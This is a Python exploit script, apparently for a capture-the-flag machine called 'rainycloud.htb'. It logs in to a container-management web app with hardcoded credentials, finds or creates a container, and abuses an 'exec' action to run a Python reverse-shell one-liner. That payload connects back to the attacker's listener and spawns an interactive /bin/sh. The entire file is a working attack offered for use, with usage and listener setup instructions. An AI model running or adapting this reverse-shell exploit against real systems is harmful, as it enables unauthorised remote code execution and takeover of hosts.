# Usage: python3 rshell.py LocalIP localPort
# setup : run a netcat listener on localPort
# waraning: before you run the script make sure your host file contain the target hostname
# Author : @akhil0x8

import requests
import sys
import re

session = requests.Session()

class rshell:
	# Initialize Class + web rshell methods

	def __init__(self,ip,port):
		self.local_ip = ip
		self.local_port = port
		self.login_url = f"http://rainycloud.htb/login"
		self.container_url = f"http://rainycloud.htb/containers"
		self.auth = {"username":"gary","password":"rubberducky"}

    # Post request for user logint4
	def UserLogin(self):
		r = session.post(url=self.login_url,data=self.auth)
		print("[+] Login as user gary")
    
    # Request for find the container ID
	def FindContainerId(self):
		r = session.get(url=self.container_url)
		ID = re.findall("[A-Fa-f0-9]{64}",r.text)
		return ID
    
    # Run command on containers
	def RunCommand(self,ContainerID):
		RawCommand = f"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{self.local_ip}\",{self.local_port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);"
		payload = f"python3 -c \'{RawCommand}\'"
		data = data = {"action":"exec "+ payload,"id": ContainerID[0]}
		r = session.post(url=self.container_url,data=data)
		print("[+] Code Executed")

    # Create new container
	def CreateContainer(self,ContainerName="new"):
		data = {"action":"create"+ ContainerName,"id":"alpine-python"}
		r = session.post(url=self.container_url,data=data)
		print("[+] Container Created")
		Containerid = self.FindContainerId()
		self.RunCommand(Containerid)


Rainycloud = rshell(sys.argv[1],sys.argv[2])
print("[+] Trying to login")
Rainycloud.UserLogin()

# If there is a container we fetch the container id and run the payload else script will create a new container and run the payload for getting the reverse shell
ContainerID = Rainycloud.FindContainerId()

if not ContainerID:
	Rainycloud.CreateContainer()
else:
	Rainycloud.RunCommand(ContainerID)